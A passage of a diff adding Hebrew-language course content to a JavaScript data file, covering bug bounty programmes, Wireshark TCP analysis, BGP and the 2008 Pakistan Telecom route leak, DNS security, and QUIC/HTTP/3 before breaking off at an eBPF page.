+  <tr><td>Synack</td><td>invitaton-only, US Gov</td><td>גבוה מאוד</td></tr>
+</table>
+<h3>Vulnerability Classifications ותשלומים</h3>
+<ul>
+<li><strong>Critical</strong> (RCE, Authentication bypass): $5,000–$100,000+</li>
+<li><strong>High</strong> (SQLi, SSRF, IDOR sensitive data): $1,000–$10,000</li>
+<li><strong>Medium</strong> (XSS stored, CSRF, info disclosure): $100–$1,000</li>
+<li><strong>Low/Info</strong>: $50–$200</li>
+</ul>
+<h3>Disclosure Process</h3>
+<ol>
+<li>מצא פגיעות ב-scope מוגדר</li>
+<li>תעד את הפגיעות (PoC, screenshots, impact)</li>
+<li>שלח דוח דרך הפלטפורמה</li>
+<li>חכה לTriaging (24-72 שעות)</li>
+<li>Coordinated Disclosure — אל תפרסם לפני שה-vendor תיקן</li>
+<li>קבל תשלום + Hall of Fame</li>
+</ol>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: מ-CTF ל-$50K ב-Apple",
+        content: `<div dir="rtl">
+<h2>Hacker בן 20 מוצא RCE ב-Apple — ומקבל $50,000</h2>
+<p>2021: Sam Curry, חוקר אבטחה בן 20, וצוות חברים מחליטים לחקור את Apple בצורה שיטתית — לאחר שלמדו Web hacking דרך CTF ו-HackTheBox.</p>
+<p>הם סרקו את כל ה-subdomains של apple.com — מצאו subdomain שמריץ instance ישן של emagic (תוכנת מוסיקה שApple רכשה ב-2002). רץ code base ישן ולא מעודכן.</p>
+<p>הם מצאו SQL injection שהוביל ל-RCE (Remote Code Execution) מלא על server של Apple. מהserver הצליחו לגשת ל-internal network.</p>
+<p><strong>Total findings ב-3 חודשים:</strong> 55 vulnerabilities. 11 criticals. Apple שילמה $289,000 בסך הכל. Report אחד בלבד — $50,000.</p>
+<p>Sam פרסם writeup מפורט שהפך viral. כיום הוא בין ה-top researchers ב-HackerOne, עובד full-time על bug bounty, מרוויח מאות אלפי דולרים בשנה.</p>
+<p><strong>הלקח:</strong> Bug bounty הוא דמוקרטי — אין דרישות ניסיון, אין CV, אין interview. רק knowledge ועקשנות. הדרך: CTF → PortSwigger Academy → Bugbounty על תוכניות קלות → בניית track record.</p>
+</div>`
+      }
+    ]
+  }
+]
   },
   {
     id: 'devops',
@@ -5354,7 +5860,483 @@ error_budget_minutes = minutes_per_month * (100 - slo) / 100
     icon: '🔬',
     color: '#a855f7',
     level: 'מתקדם',
-    chapters: [] // loaded separately
+    chapters: [
+  {
+    id: 301,
+    title: "Wireshark מתקדם",
+    pages: [
+      {
+        type: "explanation",
+        title: "קריאת TCP State Machine",
+        content: `<div dir="rtl">
+<h2>Wireshark — מעבר לצבעים</h2>
+<p>רוב האנשים פותחים Wireshark ורואים גל של חבילות צבעוניות. אנליסטים מקצועיים קוראים <strong>סיפורים</strong> — מה קרה, מתי, ולמה.</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 130" class="content-diagram">
+  <text x="180" y="16" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">TCP State Machine — החיים של חיבור</text>
+  <rect x="10" y="25" width="80" height="22" rx="4" fill="#1e3a5f"/>
+  <text x="50" y="40" text-anchor="middle" font-size="10" fill="#7dd3fc">CLOSED</text>
+  <rect x="140" y="25" width="80" height="22" rx="4" fill="#166534"/>
+  <text x="180" y="40" text-anchor="middle" font-size="10" fill="#86efac">SYN_SENT</text>
+  <rect x="270" y="25" width="80" height="22" rx="4" fill="#166534"/>
+  <text x="310" y="40" text-anchor="middle" font-size="10" fill="#86efac">SYN_RCVD</text>
+  <rect x="140" y="70" width="80" height="22" rx="4" fill="#14532d"/>
+  <text x="180" y="85" text-anchor="middle" font-size="10" fill="#4ade80">ESTABLISHED</text>
+  <rect x="10" y="70" width="80" height="22" rx="4" fill="#78350f"/>
+  <text x="50" y="85" text-anchor="middle" font-size="10" fill="#fcd34d">TIME_WAIT</text>
+  <rect x="270" y="70" width="80" height="22" rx="4" fill="#7f1d1d"/>
+  <text x="310" y="85" text-anchor="middle" font-size="10" fill="#fca5a5">CLOSE_WAIT</text>
+  <line x1="90" y1="36" x2="140" y2="36" stroke="#86efac" stroke-width="1.5" marker-end="url(#arr)"/>
+  <text x="115" y="30" text-anchor="middle" font-size="9" fill="#86efac">SYN</text>
+  <line x1="220" y1="36" x2="270" y2="36" stroke="#86efac" stroke-width="1.5" marker-end="url(#arr)"/>
+  <text x="245" y="30" text-anchor="middle" font-size="9" fill="#86efac">SYN-ACK</text>
+  <line x1="180" y1="47" x2="180" y2="70" stroke="#4ade80" stroke-width="1.5" marker-end="url(#arr)"/>
+  <text x="200" y="63" font-size="9" fill="#4ade80">ACK</text>
+  <line x1="140" y1="81" x2="90" y2="81" stroke="#fcd34d" stroke-width="1.5" marker-end="url(#arr)"/>
+  <text x="115" y="76" text-anchor="middle" font-size="9" fill="#fcd34d">FIN</text>
+  <defs><marker id="arr" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
+</svg>
+</div>
+<table class="content-table">
+  <tr><th>State</th><th>משמעות</th><th>מה לחפש</th></tr>
+  <tr><td><code>SYN_SENT</code></td><td>לקוח שלח SYN, מחכה לתגובה</td><td>אם נתקע — הסרת/firewall חסום</td></tr>
+  <tr><td><code>ESTABLISHED</code></td><td>חיבור פעיל, נתונים זורמים</td><td>RTT, window size, retransmissions</td></tr>
+  <tr><td><code>TIME_WAIT</code></td><td>חיבור נסגר, ממתין 2×MSL</td><td>המון TIME_WAIT = בעיית port exhaustion</td></tr>
+  <tr><td><code>CLOSE_WAIT</code></td><td>הצד הרחוק סגר, צד שלנו לא</td><td>bug ב-application — לא מסגר socket</td></tr>
+</table>
+<p><strong>Filter שימושי:</strong> <code>tcp.flags.syn == 1 && tcp.flags.ack == 0</code> — רואה כל ניסיון חיבור חדש.</p>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "Retransmissions ו-CWND",
+        content: `<div dir="rtl">
+<h2>TCP Congestion Control — הסיפור שמתרחש מתחת לפני</h2>
+<p>כל retransmission ב-Wireshark הוא צעקה: <em>"משהו השתבש!"</em>. להבין מה — זו האמנות.</p>
+<div class="code-preview"><pre><code># Wireshark display filters לניפוי TCP
+tcp.analysis.retransmission          # חבילות שנשלחו מחדש
+tcp.analysis.fast_retransmission     # fast retransmit (3 dup-ACK)
+tcp.analysis.duplicate_ack           # ACK כפול — אות לאיבוד חבילה
+tcp.analysis.zero_window             # receiver buffer מלא — ממתין
+tcp.analysis.window_full             # sender מלא את window הנמען
+tcp.analysis.out_of_order            # הגיע לא בסדר (jitter/reorder)
+
+# לראות RTT לכל ack:
+tcp.analysis.ack_rtt</code></pre></div>
+<table class="content-table">
+  <tr><th>ממצא</th><th>סיבה אפשרית</th><th>פתרון</th></tr>
+  <tr><td>הרבה Retransmissions</td><td>אובדן חבילות, רשת עמוסה</td><td>בדוק interface errors, שדרג קו</td></tr>
+  <tr><td>Zero Window</td><td>Application לא קורא מהיר מספיק</td><td>tune TCP buffers, בדוק CPU</td></tr>
+  <tr><td>RTT גבוה בעקביות</td><td>נתיב ארוך, סאטלייט, congestion</td><td>CDN, BBR congestion algorithm</td></tr>
+  <tr><td>Fast Retransmit</td><td>חבילה אחת אבדה, הבאות הגיעו</td><td>בדח מיקום — לרוב בשכבת הפיזי</td></tr>
+</table>
+<p><strong>כלי מובנה:</strong> Statistics → TCP Stream Graphs → Time-Sequence Graph מציג את CWND לאורך זמן — drops מופיעים כצניחות חדות.</p>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: 3 שניות שעלו $2M",
+        content: `<div dir="rtl">
+<h2>כשlatency הורס עסקאות</h2>
+<p>חברת fintech ביקשה לנתח תקרית: כל יום בדיוק ב-9:30 בבוקר, עסקאות מניות נכשלות למשך 3 שניות. בשלושת הדקות הראשונות — $2M הפסד ביום.</p>
+<p>הניתוח: פתחו Wireshark על הממשק בין שרת ה-trading לבורסה. Filter: <code>tcp.analysis.retransmission || tcp.analysis.zero_window</code>.</p>
+<p>הממצא היה מפתיע: ב-9:30:00 בדיוק — גל של Zero Window ממשרתי הבורסה. לא אובדן חבילות — receiver buffer מלא. הבורסה עצמה נחנקת בנפח פתיחת יום.</p>
+<p>הפתרון: שינוי ב-TCP buffer sizing + connection pooling + staggered reconnect (לא כולם מתחברים מחדש בו זמנית). בשלושה שינויי קוד — הבעיה נעלמה.</p>
+<div class="code-preview"><pre><code># Python socket tuning שנוסף
+import socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</code></pre></div>
+<p><strong>הלקח:</strong> Wireshark לא מוצא bugs — הוא חושף <em>מציאות</em>. הבעיה לא הייתה בקוד שלנו, אלא בהתנהגות הרשת תחת עומס. בלי packet capture — הייתם מחפשים שבועות.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 302,
+    title: "BGP — עמוד השדרה של האינטרנט",
+    pages: [
+      {
+        type: "explanation",
+        title: "iBGP ו-eBGP — שתי מציאויות",
+        content: `<div dir="rtl">
+<h2>BGP: הפרוטוקול שמחזיק את האינטרנט</h2>
+<p>BGP (Border Gateway Protocol) הוא ה-routing protocol היחיד שפועל בין Autonomous Systems — הארגונים, ISPים וחברות שמרכיבים את האינטרנט.</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 140" class="content-diagram">
+  <text x="180" y="15" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">iBGP vs eBGP</text>
+  <rect x="10" y="25" width="150" height="100" rx="8" fill="#1e293b" stroke="#3b82f6" stroke-width="2"/>
+  <text x="85" y="42" text-anchor="middle" font-size="11" fill="#93c5fd" font-weight="bold">AS 65001 (ISP A)</text>
+  <rect x="25" y="50" width="50" height="22" rx="4" fill="#1e3a5f"/>
+  <text x="50" y="65" text-anchor="middle" font-size="10" fill="#7dd3fc">Router 1</text>
+  <rect x="95" y="50" width="50" height="22" rx="4" fill="#1e3a5f"/>
+  <text x="120" y="65" text-anchor="middle" font-size="10" fill="#7dd3fc">Router 2</text>
+  <line x1="75" y1="61" x2="95" y2="61" stroke="#60a5fa" stroke-width="1.5" stroke-dasharray="4,2"/>
+  <text x="85" y="56" text-anchor="middle" font-size="8" fill="#60a5fa">iBGP</text>
+  <rect x="200" y="25" width="150" height="100" rx="8" fill="#1e293b" stroke="#22c55e" stroke-width="2"/>
+  <text x="275" y="42" text-anchor="middle" font-size="11" fill="#86efac" font-weight="bold">AS 65002 (ISP B)</text>
+  <rect x="215" y="50" width="50" height="22" rx="4" fill="#14532d"/>
+  <text x="240" y="65" text-anchor="middle" font-size="10" fill="#86efac">Router 3</text>
+  <rect x="285" y="50" width="50" height="22" rx="4" fill="#14532d"/>
+  <text x="310" y="65" text-anchor="middle" font-size="10" fill="#86efac">Router 4</text>
+  <line x1="215" y1="61" x2="285" y2="61" stroke="#4ade80" stroke-width="1.5" stroke-dasharray="4,2"/>
+  <text x="250" y="56" text-anchor="middle" font-size="8" fill="#4ade80">iBGP</text>
+  <line x1="145" y1="75" x2="200" y2="75" stroke="#f59e0b" stroke-width="2"/>
+  <text x="172" y="70" text-anchor="middle" font-size="9" fill="#fbbf24" font-weight="bold">eBGP</text>
+</svg>
+</div>
+<table class="content-table">
+  <tr><th>פרמטר</th><th>iBGP</th><th>eBGP</th></tr>
+  <tr><td>היכן פועל</td><td>בתוך AS אחד</td><td>בין ASים שונים</td></tr>
+  <tr><td>TTL</td><td>255 (כל מסלול)</td><td>1 (חייב שכן ישיר)</td></tr>
+  <tr><td>next-hop</td><td>לא משתנה כברירת מחדל</td><td>משתנה לכתובת ה-peer</td></tr>
+  <tr><td>full mesh</td><td>נדרש (או Route Reflector)</td><td>לא נדרש</td></tr>
+  <tr><td>עדכון</td><td>לא מפרסם ל-iBGP אחר</td><td>מפרסם הכל</td></tr>
+</table>
+<p><strong>Rule הכי חשוב:</strong> Router שקיבל מסלול מ-iBGP neighbor <em>לא</em> שולח אותו ל-iBGP אחר — זו הסיבה לdependency על full mesh או Route Reflectors.</p>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "Path Selection — 13 הכללים",
+        content: `<div dir="rtl">
+<h2>כיצד BGP בוחר את המסלול הטוב ביותר</h2>
+<p>כשהruter מקבל אותו prefix מכמה שכנים, הוא עובר על 13 קריטריונים לפי הסדר — הראשון שמבדיל מנצח:</p>
+<table class="content-table">
+  <tr><th>#</th><th>קריטריון</th><th>גבוה = עדיף</th></tr>
+  <tr><td>1</td><td>Weight (Cisco proprietary)</td><td>✅ גבוה</td></tr>
+  <tr><td>2</td><td>Local Preference</td><td>✅ גבוה (100 = ברירת מחדל)</td></tr>
+  <tr><td>3</td><td>Locally originated (network/aggregate)</td><td>✅ עדיפות לנתיבים שלנו</td></tr>
+  <tr><td>4</td><td>AS Path Length (קצר יותר = עדיף)</td><td>❌ קצר</td></tr>
+  <tr><td>5</td><td>Origin (IGP > EGP > ?)</td><td>✅ IGP עדיף</td></tr>
+  <tr><td>6</td><td>MED (Multi-Exit Discriminator)</td><td>❌ נמוך</td></tr>
+  <tr><td>7</td><td>eBGP > iBGP</td><td>✅ eBGP עדיף</td></tr>
+  <tr><td>8</td><td>IGP metric to next-hop</td><td>❌ נמוך</td></tr>
+  <tr><td>9-13</td><td>BGP Router ID, cluster-list, neighbor IP</td><td>tiebreakers</td></tr>
+</table>
+<p><strong>בפועל</strong>, 90% של engineering BGP הוא שינוי Local Preference ו-AS Path prepending:</p>
+<div class="code-preview"><pre><code># Cisco IOS — העדף ISP A על ISP B
+route-map PREFER_ISPA permit 10
+  set local-preference 200
+
+# AS Path Prepending — הפוך מסלול פחות אטרקטיבי
+route-map BACKUP_LINK permit 10
+  set as-path prepend 65001 65001 65001</code></pre></div>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: Pakistan Telecom 2008",
+        content: `<div dir="rtl">
+<h2>כשPakistan תקפה את YouTube — בטעות</h2>
+<p>24 בפברואר 2008: Pakistan Telecom קיבלה הוראה מהממשלה לחסום YouTube. הפתרון שבחרו — להכניס route ל-BGP שמפנה את הtrafic של YouTube לblack hole מקומי.</p>
+<p><strong>מה שקרה:</strong> במקום לשמור את הroute פנימי (iBGP בלבד), הroute דלף ל-PCCW — ה-upstream ISP של Pakistan. PCCW הפיצה אותו לשאר העולם.</p>
+<p>כרגע שזה קרה: BGP בחר את הroute של Pakistan לכל טראפיק ל-YouTube — כי הוא היה ה-<em>ספציפי יותר</em>. YouTube פרסמה <code>208.65.153.0/22</code>; Pakistan פרסמה <code>208.65.153.0/24</code> — /24 ספציפי יותר מ-/22.</p>
+<p>תוך 2 דקות: 75% מטראפיק YouTube העולמי הופנה לPakistan. YouTube הייתה נגישה רק ל-25% מהמשתמשים. משך ההפסקה: כ-2 שעות.</p>
+<div class="code-preview"><pre><code># הroute הבעייתי (רעיונית):
+# YouTube: 208.65.153.0/22 (AS 36561)
+# Pakistan: 208.65.153.0/24 (AS 17557) ← יותר ספציפי, ניצח!
+
+# BGP: Longest Prefix Match תמיד מנצח
+# /24 (256 כתובות) > /22 (1024 כתובות) מבחינת BGP</code></pre></div>
+<p><strong>הלקח:</strong> BGP הוא פרוטוקול של אמון. אין אימות מובנה — כל AS יכול לפרסם כל prefix. RPKI (Resource Public Key Infrastructure) נוצר בדיוק בגלל תקריות כאלו — קריפטוגרפית מאמת שASהוא מורשה לפרסם prefix מסוים.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 303,
+    title: "DNS בעומק",
+    pages: [
+      {
+        type: "explanation",
+        title: "Recursive Resolution — כל צעד",
+        content: `<div dir="rtl">
+<h2>מה קורה כשאתה מקליד google.com</h2>
+<p>DNS resolution נראה פשוט — בפועל זה ריקוד מדוייק בין 5 שחקנים שונים:</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 155" class="content-diagram">
+  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">DNS Full Resolution Flow</text>
+  <rect x="5" y="22" width="70" height="20" rx="4" fill="#1e3a5f"/>
+  <text x="40" y="36" text-anchor="middle" font-size="9" fill="#7dd3fc">Client</text>
+  <rect x="90" y="22" width="70" height="20" rx="4" fill="#1e3a5f"/>
+  <text x="125" y="36" text-anchor="middle" font-size="9" fill="#7dd3fc">Recursive Resolver</text>
+  <rect x="175" y="22" width="60" height="20" rx="4" fill="#14532d"/>
+  <text x="205" y="36" text-anchor="middle" font-size="9" fill="#86efac">Root NS</text>
+  <rect x="250" y="22" width="50" height="20" rx="4" fill="#78350f"/>
+  <text x="275" y="36" text-anchor="middle" font-size="9" fill="#fcd34d">TLD NS</text>
+  <rect x="310" y="22" width="45" height="20" rx="4" fill="#4c1d95"/>
+  <text x="332" y="36" text-anchor="middle" font-size="9" fill="#c4b5fd">Auth NS</text>
+  <line x1="40" y1="42" x2="125" y2="55" stroke="#7dd3fc" stroke-width="1" stroke-dasharray="3,2"/>
+  <text x="75" y="52" font-size="8" fill="#94a3b8">①google.com?</text>
+  <line x1="125" y1="55" x2="205" y2="55" stroke="#86efac" stroke-width="1"/>
+  <text x="165" y="51" font-size="8" fill="#86efac">②→Root</text>
+  <line x1="205" y1="62" x2="125" y2="70" stroke="#86efac" stroke-width="1" stroke-dasharray="3,2"/>
+  <text x="160" y="72" font-size="8" fill="#86efac">③ .com NS</text>
+  <line x1="125" y1="70" x2="275" y2="70" stroke="#fcd34d" stroke-width="1"/>
+  <text x="200" y="66" font-size="8" fill="#fcd34d">④→TLD</text>
+  <line x1="275" y1="77" x2="125" y2="88" stroke="#fcd34d" stroke-width="1" stroke-dasharray="3,2"/>
+  <text x="195" y="88" font-size="8" fill="#fcd34d">⑤ google.com NS</text>
+  <line x1="125" y1="88" x2="332" y2="88" stroke="#c4b5fd" stroke-width="1"/>
+  <text x="228" y="84" font-size="8" fill="#c4b5fd">⑥→Auth</text>
+  <line x1="332" y1="95" x2="125" y2="108" stroke="#c4b5fd" stroke-width="1" stroke-dasharray="3,2"/>
+  <text x="228" y="110" font-size="8" fill="#c4b5fd">⑦ 142.250.x.x</text>
+  <line x1="125" y1="108" x2="40" y2="120" stroke="#7dd3fc" stroke-width="1" stroke-dasharray="3,2"/>
+  <text x="75" y="122" font-size="8" fill="#7dd3fc">⑧ IP: 142.250.x.x</text>
+</svg>
+</div>
+<table class="content-table">
+  <tr><th>שחקן</th><th>תפקיד</th><th>דוגמה</th></tr>
+  <tr><td>Client</td><td>שולח שאילתה ל-resolver</td><td>דפדפן שלך</td></tr>
+  <tr><td>Recursive Resolver</td><td>עושה את כל העבודה בשבילך</td><td>8.8.8.8 (Google), 1.1.1.1 (CF)</td></tr>
+  <tr><td>Root Nameserver</td><td>יודע רק מי אחראי על TLD</td><td>13 clusters (a-m.root-servers.net)</td></tr>
+  <tr><td>TLD Nameserver</td><td>יודע מי אחראי על domain</td><td>Verisign לכל .com</td></tr>
+  <tr><td>Authoritative NS</td><td>יודע את ה-IP האמיתי</td><td>ns1.google.com</td></tr>
+</table>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "DNSSEC, DoH, DoT — אבטחה",
+        content: `<div dir="rtl">
+<h2>DNS: הפרוטוקול הכי פגיע ב-stack</h2>
+<p>DNS מקורי: UDP port 53, ללא הצפנה, ללא אימות. כל מי שבדרך יכול לזייף תשובות.</p>
+<h3>DNSSEC — חתימות קריפטוגרפיות</h3>
+<p>כל record מלווה בחתימה דיגיטלית. ה-resolver מאמת את השרשרת מה-Root ועד ה-record.</p>
+<div class="code-preview"><pre><code># בדיקת DNSSEC עם dig
+dig +dnssec cloudflare.com
+
+# רשומות DNSSEC:
+# RRSIG — חתימה על record set
+# DNSKEY — המפתח הציבורי
+# DS — Delegation Signer (שרשרת אמון)
+# NSEC/NSEC3 — הוכחת אי-קיום domain</code></pre></div>
+<h3>DNS-over-HTTPS (DoH) ו-DNS-over-TLS (DoT)</h3>
+<table class="content-table">
+  <tr><th>פרוטוקול</th><th>פורט</th><th>הצפנה</th><th>פרטיות מ-ISP</th></tr>
+  <tr><td>DNS רגיל</td><td>53/UDP</td><td>❌ ללא</td><td>❌ גלוי</td></tr>
+  <tr><td>DoT</td><td>853/TCP</td><td>✅ TLS</td><td>✅ מוצפן</td></tr>
+  <tr><td>DoH</td><td>443/HTTPS</td><td>✅ TLS</td><td>✅ מוצפן + נראה כHTTPS</td></tr>
+  <tr><td>DoQ</td><td>853/UDP-QUIC</td><td>✅ QUIC</td><td>✅ מהיר יותר</td></tr>
+</table>
+<h3>Anycast — למה 8.8.8.8 מהיר מכל מקום בעולם</h3>
+<p>Google מפרסמת את 8.8.8.8 מ-dozens of locations עם BGP Anycast. BGP always routes to the "closest" — כך שאתה בישראל מדבר עם datacenter בישראל/אירופה, לא בארה"ב.</p>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: DNS Hijacking של ISP",
+        content: `<div dir="rtl">
+<h2>כשה-ISP שלך קורא את השאילתות שלך</h2>
+<p>שנת 2018: חוקר אבטחה גילה שISP ישראלי מפנה שאילתות DNS לשגיאה (NXDOMAIN) לדף ה-search שלו — גניבת תעבורה מדומיינים שגויים.</p>
+<p>זה לגיטימי? עמום. אבל זה הדגים: ה-ISP רואה הכל. כל domain שגלשת אליו — גלוי לחלוטין בDNS.</p>
+<p>מתקפות DNS אמיתיות יותר:</p>
+<ul>
+<li><strong>DNS Cache Poisoning</strong> (Kaminsky 2008): בגלל UDP, אפשר לנחש את ה-transaction ID ולהזריק תשובה מזויפת ל-cache של ה-resolver</li>
+<li><strong>DNS Hijacking</strong>: שינוי ה-DNS settings על ה-router (לרוב דרך default password) → כל הרשת מדברת עם resolvers זדוניים</li>
+<li><strong>NXNS Attack</strong>: גרום ל-recursive resolver לשלוח מיליוני שאילתות ל-victim NS → DDoS</li>
+</ul>
+<p><strong>הפתרון שהפך מקובל:</strong> Cloudflare 1.1.1.1 עם DoH. הISP שלך רואה HTTPS ל-1.1.1.1, לא DNS queries. חברות מאמצות DNS filtering (Cisco Umbrella) בתוך ה-VPN שלהן.</p>
+<p><strong>הלקח:</strong> DNS הוא ה-phonebook של האינטרנט. מי ששולט בו — שולט במה אתה מגיע אליו.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 304,
+    title: "QUIC ו-HTTP/3",
+    pages: [
+      {
+        type: "explanation",
+        title: "בעיית HOL Blocking שHTTP/2 לא פתר",
+        content: `<div dir="rtl">
+<h2>למה HTTP/2 לא מספיק</h2>
+<p>HTTP/2 הביא multiplexing — שליחת מספר streams בחיבור TCP אחד. אבל TCP לא יודע שיש כמה streams...</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 130" class="content-diagram">
+  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">HOL Blocking — HTTP/2 vs HTTP/3</text>
+  <text x="90" y="30" text-anchor="middle" font-size="10" fill="#f87171" font-weight="bold">HTTP/2 over TCP</text>
+  <rect x="10" y="38" width="50" height="14" rx="3" fill="#1e3a5f"/>
+  <text x="35" y="48" text-anchor="middle" font-size="8" fill="#7dd3fc">Stream 1</text>
+  <rect x="65" y="38" width="50" height="14" rx="3" fill="#7f1d1d"/>
+  <text x="90" y="48" text-anchor="middle" font-size="8" fill="#fca5a5">LOST ❌</text>
+  <rect x="120" y="38" width="50" height="14" rx="3" fill="#374151"/>
+  <text x="145" y="48" text-anchor="middle" font-size="8" fill="#9ca3af">Stream 3 ⏳</text>
+  <text x="90" y="66" text-anchor="middle" font-size="9" fill="#f87171">חבילה אחת אבדה → כל הstreams מחכים!</text>
+  <text x="270" y="30" text-anchor="middle" font-size="10" fill="#4ade80" font-weight="bold">HTTP/3 over QUIC</text>
+  <rect x="190" y="38" width="50" height="14" rx="3" fill="#14532d"/>
+  <text x="215" y="48" text-anchor="middle" font-size="8" fill="#86efac">Stream 1 ✅</text>
+  <rect x="245" y="38" width="50" height="14" rx="3" fill="#7f1d1d"/>
+  <text x="270" y="48" text-anchor="middle" font-size="8" fill="#fca5a5">LOST ❌</text>
+  <rect x="300" y="38" width="50" height="14" rx="3" fill="#14532d"/>
+  <text x="325" y="48" text-anchor="middle" font-size="8" fill="#86efac">Stream 3 ✅</text>
+  <text x="270" y="66" text-anchor="middle" font-size="9" fill="#4ade80">Stream 2 אבד → רק Stream 2 מחכה!</text>
+  <line x1="10" y1="80" x2="350" y2="80" stroke="#334155" stroke-width="1" stroke-dasharray="5,3"/>
+  <text x="180" y="95" text-anchor="middle" font-size="10" fill="#94a3b8">QUIC = streams עצמאיים לחלוטין בתוך UDP</text>
+  <text x="180" y="112" text-anchor="middle" font-size="9" fill="#64748b">אובדן חבילה ב-stream אחד לא חוסם שאר הstreams</text>
+</svg>
+</div>
+<p>ב-HTTP/2, אם packet אחד אובד, TCP מחכה להחזרתו — וכל 10 ה-streams שבאותו TCP connection <em>קפואים</em>. זה Head-of-Line (HOL) blocking ברמת TCP.</p>
+<p>QUIC בנה streams עצמאיים מעל UDP — אובדן packet ב-stream 2 חוסם רק את stream 2.</p>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "0-RTT ו-Connection Migration",
+        content: `<div dir="rtl">
+<h2>QUIC: מה שמבדיל אותו מ-TCP+TLS</h2>
+<h3>0-RTT Connection Resumption</h3>
+<p>TCP + TLS 1.3 = 1 RTT לחיבור חדש. אבל עם session resumption, QUIC שולח נתונים ב-first packet:</p>
+<div class="code-preview"><pre><code>TCP + TLS 1.3 (חיבור ראשוני):
+  SYN →
+  ← SYN-ACK          (1 RTT)
+  TLS ClientHello →
+  ← TLS ServerHello   (2 RTT)
+  נתונים →            (3 RTT!)
+
+QUIC 0-RTT (חיבור חוזר):
+  ClientHello + נתונים →  (0 RTT!)
+  ← Server response</code></pre></div>
+<h3>Connection Migration</h3>
+<p>TCP = זוהה על ידי (src IP, src port, dst IP, dst port). מעבר מWiFi לסלולרי → חיבור נשבר.</p>
+<p>QUIC = זוהה על ידי <strong>Connection ID</strong> אקראי. מעבר מWiFi לסלולרי → QUIC ממשיך בצורה שקופה. ה-stream לא נקטע.</p>
+<table class="content-table">
+  <tr><th>תכונה</th><th>TCP+TLS</th><th>QUIC</th></tr>
+  <tr><td>חיבור ראשוני</td><td>1-3 RTT</td><td>1 RTT</td></tr>
+  <tr><td>חיבור חוזר</td><td>1 RTT</td><td>0 RTT</td></tr>
+  <tr><td>HOL blocking</td><td>ברמת TCP</td><td>אין</td></tr>
+  <tr><td>Network migration</td><td>שובר חיבור</td><td>שקוף</td></tr>
+  <tr><td>מוצפן</td><td>TLS שכבה נפרדת</td><td>מובנה בפרוטוקול</td></tr>
+</table>
+<p><strong>HTTP/3</strong> הוא HTTP/2 semantics מעל QUIC במקום TCP. כבר נתמך ב-Chrome, Firefox, Safari, nginx, Cloudflare.</p>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: Google QUIC לפני שהעולם ידע",
+        content: `<div dir="rtl">
+<h2>איך Google בנתה QUIC בשקט ואז שינתה את האינטרנט</h2>
+<p>2012: Google שמה לב שTCP הוא bottleneck אמיתי — בעיקר על mobile networks עם packet loss גבוה. הפתרון של IETF יקח שנים. Google החליטה לפתרת לבד.</p>
+<p>הם בנו QUIC תחילה כexperimental protocol, והפעילו אותו כברירת מחדל ב-Chrome ← Google Servers. המשתמשים לא ידעו — פשוט YouTube וChrome הרגישו מהירים יותר.</p>
+<p>2015: Google פרסמה ש-~50% מבקשות Chrome כבר הולכות על QUIC. הנתונים הראו: חיבורי QUIC מהירים ב-30% ב-tail latency (percentile 99) לעומת TCP.</p>
+<p>2018: Google הגישה QUIC ל-IETF לסטנדרטיזציה. אבל IETF שינתה הרבה — IETF QUIC שונה מGoogle QUIC. 2021: RFC 9000 — QUIC סטנדרטי, HTTP/3 (RFC 9114).</p>
+<p>2023: כ-30% מהwebsites הגדולים תומכים בHTTP/3. כל request ל-cloudflare.com, google.com, facebook.com — כבר QUIC.</p>
+<p><strong>הלקח:</strong> לפעמים הדרך לשנות סטנדרט היא לא לשכנע ועדה — אלא לבנות, לפרוס, לאסוף נתונים, ואז לבוא עם facts. Google שינתה את הinternet layer בשקט.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 305,
+    title: "eBPF ורשתות בר-תכנות",
+    pages: [
+      {
+        type: "explanation",
+        title: "eBPF — תכנות הגרעין מבחוץ",
+        content: `<div dir="rtl">
+<h2>eBPF: הטכנולוגיה שמשנה Linux networking</h2>
+<p>eBPF (extended Berkeley Packet Filter) מאפשר להריץ programs קטנים <em>בתוך</em> ה-Linux kernel — בלי לשנות קוד kernel ובלי module. הגרעין מריץ bytecode שעבר verification.</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 140" class="content-diagram">
+  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">eBPF Architecture</text>
+  <rect x="10" y="22" width="160" height="30" rx="6" fill="#1e293b" stroke="#64748b"/>
+  <text x="90" y="41" text-anchor="middle" font-size="10" fill="#94a3b8">User Space — eBPF Program (C)</text>
+  <rect x="180" y="22" width="170" height="30" rx="6" fill="#1e293b" stroke="#64748b"/>
+  <text x="265" y="41" text-anchor="middle" font-size="10" fill="#94a3b8">clang/llvm → eBPF bytecode</text>
+  <line x1="180" y1="37" x2="180" y2="70" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,2"/>
